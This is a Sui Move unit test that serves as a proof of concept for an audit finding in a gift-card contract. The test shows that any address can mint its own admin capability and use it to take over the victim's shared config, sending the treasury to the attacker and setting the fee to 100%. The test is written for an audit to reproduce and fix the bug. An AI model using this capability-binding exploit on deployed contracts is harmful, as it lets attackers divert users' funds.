#[test_only]
module brisk::audit_poc_tests;

// PoC for finding DB-4673: GiftCardConfig 权限可被任意地址劫持
//
// Root cause: `create_config` is `public fun` with no caller check, so anyone
// can call it and receive a fresh `GiftCardAdminCap`. The cap is just
// `key, store { id: UID }` — it is NOT bound to any specific config (no
// `config: ID` field, no issuer binding). `set_fee` and `set_treasury` take
// `_admin: &GiftCardAdminCap` and only check that *some* valid cap was passed;
// they never check that the cap belongs to the config being mutated. As a
// result, an attacker can mint their own cap and use it to rewrite the victim's
// shared config (`treasury` redirected to the attacker, `fee_bps` set to the
// max). This test reproduces both: the attacker's self-minted cap successfully
// mutates the deployer/victim's GiftCardConfig.

use brisk::gift_card::{Self, GiftCardAdminCap, GiftCardConfig};
use std::unit_test;
use sui::test_scenario as ts;

const DEPLOYER: address = @0xD;
const ATTACKER: address = @0xE;

#[test]
fun attacker_self_minted_cap_hijacks_victim_config_treasury_and_fee() {
    let mut sc = ts::begin(DEPLOYER);

    // --- Victim (deployer) creates the canonical GiftCardConfig. ---
    // init_for_testing wraps create_config(300, DEPLOYER, ctx), so the deployer
    // receives the legitimate GiftCardAdminCap and the shared GiftCardConfig is
    // created with treasury = DEPLOYER and fee_bps = 300.
    gift_card::init_for_testing(ts::ctx(&mut sc));

    // End the deployer's tx so the freshly-transferred cap lands in inventory.
    ts::next_tx(&mut sc, DEPLOYER);

    // Take the legitimate admin cap out of the deployer's inventory. We will
    // NOT use it — the whole point of the PoC is that the attacker does not
    // need it.
    let legit_cap = ts::take_from_sender<GiftCardAdminCap>(&sc);

    // --- Attacker runs create_config() themselves. ---
    // create_config is `public fun` with no sender/caller check, so the attacker
    // freely mints a SECOND GiftCardAdminCap that is NOT bound to the victim's
    // config (the struct only stores `id: UID`).
    ts::next_tx(&mut sc, ATTACKER);
    gift_card::create_config(0, ATTACKER, ts::ctx(&mut sc));
    // End the attacker's tx so the freshly-transferred cap lands in inventory.
    ts::next_tx(&mut sc, ATTACKER);
    let attacker_cap = ts::take_from_sender<GiftCardAdminCap>(&sc);

    // --- Identify the VICTIM config (the one whose treasury is DEPLOYER). ---
    // Both shared GiftCardConfigs are now in the scenario; the victim's is the
    // one initialized with treasury == DEPLOYER and fee_bps == 300.
    let mut victim_config = ts::take_shared<GiftCardConfig>(&sc);
    if (gift_card::treasury(&victim_config) != DEPLOYER) {
        // Got the attacker's config — return it and grab the other one.
        ts::return_shared(victim_config);
        victim_config = ts::take_shared<GiftCardConfig>(&sc);
    };
    assert!(gift_card::treasury(&victim_config) == DEPLOYER, 102);
    assert!(gift_card::fee_bps(&victim_config) == 300, 103);

    // --- Exploit 1: attacker rewrites the VICTIM config's treasury. ---
    // set_treasury takes `_admin: &GiftCardAdminCap` — it never checks the cap
    // belongs to this config. Passing the attacker's own cap against the
    // victim's config mutates it.
    gift_card::set_treasury(&attacker_cap, &mut victim_config, ATTACKER);

    // BUG REPRODUCED: the victim config's treasury is now the attacker.
    assert!(gift_card::treasury(&victim_config) == ATTACKER, 200);

    // --- Exploit 2: attacker maxes out the VICTIM config's fee. ---
    gift_card::set_fee(&attacker_cap, &mut victim_config, 10000);

    // BUG REPRODUCED (second time): fee is now 100% (the max allowed).
    assert!(gift_card::fee_bps(&victim_config) == 10000, 201);

    ts::return_shared(victim_config);

    // Cleanup: destroy both caps (they have `store`; unit_test::destroy drops
    // the inner UID).
    unit_test::destroy(legit_cap);
    unit_test::destroy(attacker_cap);

    ts::end(sc);
}
